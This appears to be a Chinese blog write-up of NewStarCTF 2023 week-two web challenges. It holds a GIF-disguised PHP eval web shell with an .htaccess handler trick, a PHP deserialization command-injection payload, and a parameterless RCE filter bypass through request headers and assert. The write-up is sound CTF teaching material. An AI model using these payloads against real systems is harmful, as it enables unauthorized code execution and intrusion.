+<h2 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004171830952.png" srcset="/img/loading.gif" lazyload alt="image-20231004171830952"></p>
+<p>这是一道文件上传题，我们先上传一个php文件并抓包一下:</p>
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004172115084.png" srcset="/img/loading.gif" lazyload alt="image-20231004172115084"></p>
+<p>发现bp没有响应，前端直接返回判断信息，要使bp能够抓取信息，可以在浏览器中关闭前端js</p>
+<p>这里偷懒直接上传了用js写的php文件的图片形式:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">GIF89</span>a<br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;@<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;pass&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004172603995.png" srcset="/img/loading.gif" lazyload alt="image-20231004172603995"></p>
+<p>发现成功上传！！！</p>
+<p>由于无法抓包，我们需要再上传.htaccess文件对同一个文件夹下的指定图片文件进行解析:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;FilesMatch &quot;showfiles3.jpg&quot;&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004172835389.png" srcset="/img/loading.gif" lazyload alt="image-20231004172835389"></p>
+<p>发现成功上传到同一目录下</p>
+<p>访问木马图片:</p>
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004172930848.png" srcset="/img/loading.gif" lazyload alt="image-20231004172930848"></p>
+<p>成功！！！</p>
+<p>payload:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&#x27;ls /&#x27;);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004173020270.png" srcset="/img/loading.gif" lazyload alt="image-20231004173020270"></p>
+<p>发现flag文件:this_is_flag</p>
+<p>payload:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&#x27;cat /this_is_flag&#x27;);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004173154948.png" srcset="/img/loading.gif" lazyload alt="image-20231004173154948"></p>
+<h2 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h2><p>代码审计:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-comment">//私有变量$cmd</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-comment">//反序列化会自动调用</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//过滤常规的文件打开命令</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            <span class="hljs-comment">//进行系统命令执行</span><br>            @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//反序列化传入的变量值</span><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;unser&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>构造反序列化：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-comment">//私有变量只能直接赋值</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;ls /&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            <span class="hljs-comment">// @system($this-&gt;cmd);</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// @unserialize($_POST[&#x27;unser&#x27;]);</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-variable">$obj1</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj1</span>;<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>这里发现url编码的内容无法被执行，所以采用源码<br>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:4:&quot;ls /&quot;;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004175532104.png" srcset="/img/loading.gif" lazyload alt="image-20231004175532104"></p>
+<p>发现文件:th1s_1s_fffflllll4444aaaggggg</p>
+<p>payload:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:33:&quot;nl /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004175916496.png" srcset="/img/loading.gif" lazyload alt="image-20231004175916496"></p>
+<h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004212050514.png" srcset="/img/loading.gif" lazyload alt="image-20231004212050514"></p>
+<p>有题目的英文提示得，该网页存在文件泄露,先尝试.git泄露：</p>
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004212637348.png" srcset="/img/loading.gif" lazyload alt="image-20231004212637348"></p>
+<p>发现存在bo0g1pop.php</p>
+<p>对bo0g1pop.php进行代码审计:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">//正则匹配funname(funname1()funname2())形式的字符串，即我们不能传参数在函数中</span><br><span class="hljs-comment">//\((?R)?\):表示将()作为递归的模板进行递归匹配字符串，递归一般从最里面进行匹配</span><br><span class="hljs-comment">//无参RCE</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123;<br>    <span class="hljs-comment">//对一些函数进行过滤</span><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]);<span class="hljs-comment">//存在危险代码执行漏洞</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里使用无参RCE的函数:getallheaders()</p>
+<p>这个函数的作用是获取http请求头中的信息，并以关联数组的形式返回:<br>payload:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">先观察该网页http请求头的第一个健是谁:<br>?star=print(getallheaders());<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004232607329.png" srcset="/img/loading.gif" lazyload alt="image-20231004232607329"></p>
+<p>由于直接输出数组头元素为Array,所以我们需要用next()函数使数组定位到第二个元素输出：<br>payload:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?star=print(next(getallheaders()));<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004232730086.png" srcset="/img/loading.gif" lazyload alt="image-20231004232730086"></p>
+<p>发现输出了请求头User-Agent的值，即第二个请求头的值</p>
+<p>我们伪造一下第二个请求头User-Agent的内容:<br>payload:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">headers:<br>User-Agent:666<br><br>?star=print(next(getallheaders()));<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004234434183.png" srcset="/img/loading.gif" lazyload alt="image-20231004234434183"></p>
+<p>发现成功被执行</p>
+<p>payload:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">headers:<br>User-Agent:system(&#x27;ls /&#x27;);<br><br>?star=assert(next(getallheaders()));<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004234547770.png" srcset="/img/loading.gif" lazyload alt="image-20231004234547770"></p>
+<p>payload:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">headers:<br>User-Agent:system(&#x27;head /flag&#x27;);<br><br>?star=assert(next(getallheaders()));<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-9-Newstar-2/image-20231004234627391.png" srcset="/img/loading.gif" lazyload alt="image-20231004234627391"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>NewStarCTF 2023_第二周WP</div>
+      <div>http://example.com/2023/10/09/2023-10-9-newstarweek2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>South</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/04/2023-10-4-Newstar_1/" title="NewStarCTF 2023_第一周WP">
+                        <span class="hidden-mobile">NewStarCTF 2023_第一周WP</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"ThR4XZRMA2SwXDt3MeF5vjCN-gzGzoHsz","appKey":"PmUqfFPhyiQDRYmHOO0IXjTV","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量
+        <span id="busuanzi_value_site_pv"></span>
+        次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数
+        <span id="busuanzi_value_site_uv"></span>
+        人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
